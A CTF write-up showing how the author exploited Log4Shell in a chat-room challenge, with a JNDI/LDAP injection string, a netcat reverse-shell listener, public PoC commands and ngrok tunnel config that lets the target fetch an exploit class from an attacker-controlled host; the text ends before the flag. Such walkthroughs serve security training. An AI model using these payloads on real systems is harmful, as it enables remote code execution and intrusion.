# Log for Jodie (Log4Shell CVE)

Hi there!
Here is how I've solved the "Log for Jodie" challenge in LNC CTF 2022.

# WARNING
This writeup is for EDUCATIONAL PURPOSES only. I do not have any responsibility if you face any legal consequences arising from the usage of this PoC.

## Challenge description

I found a chatroom for coffee lovers. Right now it's going strong but it would be better with more people! So tell your friends about it now! Oh, btw did you hear? Minecraft got hacked.
`nc c2.lagncrash.com 8003`

## Solution & step-by-step walkthrough
This challenge seems to be using Log4Shell, an exploit for Apache Log4J that was released in late 2021.  
https://en.wikipedia.org/wiki/Log4Shell  
It allows one to RCE into other servers just by using JNDI paired with LDAP. 

Knowledge of Java (and Python) is useful, although not strictly required.

Firstly, let us netcat into the server provided.
![Screenshot from 2022-03-25 15-00-11](https://user-images.githubusercontent.com/58442255/160070697-9cb70585-3270-4e1b-bbae-2490d89bfc9d.png)  
The server has spawned a link for us to connect. Let us connect to that as well.
![Screenshot from 2022-03-25 15-02-05](https://user-images.githubusercontent.com/58442255/160070820-4a6a2ca1-1983-46b3-bd62-fff3746e865c.png)  
Create a nickname and start messaging.

Let's test if the application is vulnerable. You can use any Log4J testing tool on the Internet to test.  
I found this one: https://log4shell.tools/  
Here's a screenshot:
![Screenshot from 2022-03-25 14-59-12](https://user-images.githubusercontent.com/58442255/160070457-918b9ed3-be83-4572-8e96-2cdcccc5892a.png)
Let's enter the JNDI LDAP string into the chat app:
![Screenshot from 2022-03-25 15-07-12](https://user-images.githubusercontent.com/58442255/160071615-8d93a4bd-7d0e-465e-805f-f34beb1c3be6.png)
The server is <b>vulnerable.</b>

Now that we know that the server is vulnerable, how do we RCE into it and get the flag?   
A quick search returns several Log4Shell PoCs, which I used this one: https://github.com/kozmer/log4j-shell-poc

Run:  

```sh
pip install -r requirements.txt
```

Do note that you have to download Oracle JDK at https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html. The download is under the  Java SE Development Kit 8u20 section, can use CTRL+F for that.  
You need an Oracle account for this. If you do not want to reveal your email address, you can use Firefox Relay (https://relay.firefox.com)  
Once you've downloaded the JDK zip, unzip it into the Log4J exploit folder like so:
![Screenshot from 2022-03-25 16-41-53](https://user-images.githubusercontent.com/58442255/160085859-fbf994fa-f92c-4cfc-8a5a-8b03b6b209db.png)


And then run these 2 simultaneously in different sessions:
`nc -lvnp 9001` and `python3 poc.py --userip localhost --webport 8000 --lport 9001`

![Screenshot from 2022-03-25 16-59-03](https://user-images.githubusercontent.com/58442255/160088969-1bd90197-a342-4a6e-8329-e31ed4cf3edb.png)


From here, we can see that the PoC is doing input/output from `localhost`. Unfortunately, `localhost` is not available on the Internet, hence the remote server cannot access the exploit.




A quick search online on exposing localhost to the Internet returns this Stack Overflow post: https://stackoverflow.com/questions/5108483/access-localhost-from-the-internet. This explains how to setup a tunnel for localhost ports.  
Since we're doing it from localhost and a local tunnel, **there is no need to setup a dedicated web server**.  

Out of the 3 services listed, only `ngrok` worked for me. Head to https://ngrok.com/ and create an account (same thing as above, you can use [Firefox Relay](https://relay.firefox.com) if you don't want to reveal your email) 

![Screenshot from 2022-03-25 16-54-35](https://user-images.githubusercontent.com/58442255/160088584-fede8779-1458-4dd6-803b-f2fcf7aa6bf3.png)

(if `ngrok` does not work try `./ngrok` from the directory that you unzipped the file)
Follow Steps 1 and 2. 
For step 3, we need to specify the ports. The web server where exploit class is located is at port 8000, while JNDI/LDAP server is at 1389. For the JNDI/LDAP server, after some testing, I found that we cannot use HTTP. We need to use TCP.  

To open multiple ports at once, you can do this:

Edit `~/.ngrok2/ngrok.yml` and put:
```
authtoken: <YOUR AUTH TOKEN HERE>
tunnels:
  first:
    addr: 1389
    proto: tcp
  second:
    addr: 8000
    proto: http
```
Type `./ngrok start --all ` to create both TCP and HTTP servers.
![Screenshot from 2022-03-25 17-17-29](https://user-images.githubusercontent.com/58442255/160091925-112d5210-4298-4aac-b2ed-395ea890ed73.png)

Once we have that settled, we can replace the URL in the JNDI/LDAP string from `${jndi:ldap://localhost:1389/a}` to `${jndi:ldap://<TCP ADDRESS HERE>/a}`

e.g.
`${jndi:ldap://4.tcp.ngrok.io:15199/a}`

When we paste that in, head to the Python poc.py and you will see something like
```
Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.class
```

The localhost servers are already ported, but as you can see, the chat application is still on localhost.
